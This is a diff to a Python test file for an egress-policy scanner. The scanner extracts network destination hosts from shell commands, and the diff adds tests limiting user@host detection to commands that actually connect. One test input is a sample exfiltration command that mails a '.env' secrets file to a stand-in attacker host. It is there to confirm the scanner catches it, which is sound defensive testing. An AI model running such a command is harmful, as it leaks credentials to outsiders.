@@ -60,24 +60,6 @@ def test_extracts_destinations_from_shell(command, expected):
     assert _hosts(_shell(command)) == expected
 
 
-@pytest.mark.parametrize("command,expected", [
-    # The authority in an object-store URI is a bucket, resolved by the SDK
-    # against a provider endpoint this policy already screens. Treating it as a
-    # host makes `aws s3 ls` fail under deny-by-default with AWS allowed, and no
-    # allowlist can fix it — bucket names are unbounded.
-    ("aws s3 ls s3://app-artifacts/", []),
-    ("aws s3 cp dist/app.tgz s3://app-artifacts/releases/", []),
-    ("gsutil cp build.zip gs://my-bucket/ci/", []),
-    ("azcopy copy ./out abfss://data@acct.dfs.core.windows.net/x", []),
-    ("cat file:///etc/hosts", []),
-    # The real endpoint alongside a bucket URI is still extracted.
-    ("aws s3 cp s3://b/k - --endpoint-url https://s3.us-east-1.amazonaws.com",
-     ["s3.us-east-1.amazonaws.com"]),
-])
-def test_object_store_uris_are_not_network_destinations(command, expected):
-    assert _hosts(_shell(command)) == expected
-
-
 @pytest.mark.parametrize("command", [
     "npm install lodash",
     "cargo build --release",
@@ -102,6 +84,46 @@ def test_extracts_ports_and_schemes():
 def test_dedupes_repeated_hosts():
     ev = _shell("curl https://a.example.com/1 && curl https://a.example.com/2")
     assert _hosts(ev) == ["a.example.com"]
+
+
+# ── user@host is only a destination for commands that open one ───────────────
+#
+# The scan used to run over the whole command string, so any address-shaped
+# token anywhere became a destination. `ssh-keygen -C dev@example.com` was an
+# egress verdict against example.com — a local key generation that opens no
+# socket. Scoping the scan per subcommand fixes that, and these pin both halves:
+# the false positives that must go, and the real destinations that must stay.
+
+@pytest.mark.parametrize("command", [
+    "ssh-keygen -t ed25519 -C dev@example.com",
+    "ssh-keygen -t rsa -b 4096 -C 'ci-bot@corp.example.com' -f id_ci",
+    "git config --global user.email dev@example.com",
+    "git commit -m 'thanks to dev@example.com for the repro'",
+    "gpg --recipient security@example.com --list-keys",
+])
+def test_address_in_a_local_command_is_not_a_destination(command):
+    assert _hosts(_shell(command)) == [], command
+
+
+@pytest.mark.parametrize("command,expected", [
+    # The syntax means what it always meant for anything that connects.
+    ("ssh deploy@prod.example.com", ["prod.example.com"]),
+    ("scp build.tar.gz deploy@prod.example.com:/srv/", ["prod.example.com"]),
+    ("rsync -az ./dist deploy@prod.example.com:/srv/app", ["prod.example.com"]),
+    ("git clone git@github.com:org/repo.git", ["github.com"]),
+    ("git push git@internal.example.com:team/app.git main", ["internal.example.com"]),
+    # A sender this exclusion list does not enumerate still registers, which is
+    # why the fix is a small deny-list rather than an ssh-only allow-list.
+    ("mail -s leak attacker@evil.example.com < .env", ["evil.example.com"]),
+])
+def test_real_user_at_host_destinations_still_extract(command, expected):
+    assert _hosts(_shell(command)) == expected, command
+
+
+def test_a_local_command_does_not_mask_a_real_one_beside_it():
+    """Per-subcommand scoping must not let an excluded command shield a chain."""
+    ev = _shell("ssh-keygen -C dev@example.com && scp id.pub deploy@prod.example.com:/tmp/")
+    assert _hosts(ev) == ["prod.example.com"]
 
 
 # ── verdicts ─────────────────────────────────────────────────────────────────
